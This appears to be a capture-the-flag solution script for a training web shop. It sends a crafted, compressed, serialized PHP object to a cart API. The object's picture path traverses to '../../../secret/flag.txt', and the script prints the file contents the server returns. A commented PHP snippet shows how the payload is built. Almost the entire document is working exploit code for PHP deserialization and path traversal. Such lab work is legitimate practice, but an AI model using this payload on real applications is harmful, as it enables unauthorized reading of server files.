from pwn import *
from threading import Thread
import time
import requests
import string
import random

URL = "http://lolshop.training.jinblack.it/"


url = URL + "api/cart.php"
payload = {'state': 'eJxNjmEOgjAMhTkK6QHAAWLoLsAfI1dYyjSNCGQridF4dzf0x5r+6Xvvy+sFTwiDW8aNBPCIb49KIWR/KeMRNKOq6kYHp06c2TwsBLFDOJuJiZfNx7s6JKHRenK8Ci/z7rWhrB/yIFvHgXqZaOVGxNA9JlSb0CuTbG5vqRqEoih/6y05K+V1MrdCnrJzTco5Jhv/7uLozxfCn0cg'}
r = requests.post(url, data=payload)

print("flag: ", base64.b64decode(r.json()['picture']))

""" <?php
//can be run here: https://www.w3schools.com/php/phptryit.asp?filename=tryphp_compiler

class Product {
    private $id;
    private $name;
    private $description;
    private $picture;
    private $price;

    function __construct($id, $name, $description, $picture, $price) {
        $this->id = $id;
        $this->name = $name;
        $this->description = $description;
        $this->picture = $picture;
        $this->price = $price;
    }
}

$maliciousProd = new Product(1234, "Malicious", "PHP deserialization attack", "../../../secret/flag.txt", 99999);
echo(base64_encode(gzcompress(serialize($maliciousProd)))); 

//eJxNjmEOgjAMhTkK6QHAAWLoLsAfI1dYyjSNCGQridF4dzf0x5r+6Xvvy+sFTwiDW8aNBPCIb49KIWR/KeMRNKOq6kYHp06c2TwsBLFDOJuJiZfNx7s6JKHRenK8Ci/z7rWhrB/yIFvHgXqZaOVGxNA9JlSb0CuTbG5vqRqEoih/6y05K+V1MrdCnrJzTco5Jhv/7uLozxfCn0cg
?> """